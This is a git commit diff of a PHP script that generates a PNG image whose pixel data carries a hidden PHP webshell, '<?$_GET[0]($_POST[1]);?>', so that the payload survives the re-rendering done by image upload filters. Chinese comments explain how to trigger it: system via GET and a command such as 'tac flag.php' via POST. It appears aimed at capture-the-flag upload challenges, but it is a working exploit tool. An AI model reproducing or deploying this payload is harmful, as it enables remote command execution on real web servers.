301a98d845080762d4fbc97edbd491c8596d6fdd
工藤权一 <115307551@qq.com>
2022-12-21 21:30:56 +0800

    Update PNG二次渲染-写马.php

--- PNG二次渲染-写马.php
+++ PNG二次渲染-写马.php
@@ -1,3 +1,4 @@
+
 <?php
 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
@@ -7,11 +8,11 @@ $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
            0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
            0x66, 0x44, 0x50, 0x33);
-
-
-
+ 
+ 
+ 
 $img = imagecreatetruecolor(32, 32);
-
+ 
 for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
@@ -19,8 +20,18 @@ for ($y = 0; $y < sizeof($p); $y += 3) {
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
 }
-
-imagepng($img,'./1.png');
+ 
+imagepng($img,'1.png');  //要修改的图片的路径
+ 
+/* 木马内容
+<?$_GET[0]($_POST[1]);?>
+ */
+//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在
+//会在目录下自动创建一个1.png图片
+//图片脚本内容：$_GET[0]($_POST[1]);
+//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php
+ 
 ?>
-
-// (use) php exp.php 1.jpg
+------------------------------------
+           创建1.png图片成功！      
+------------------------------------
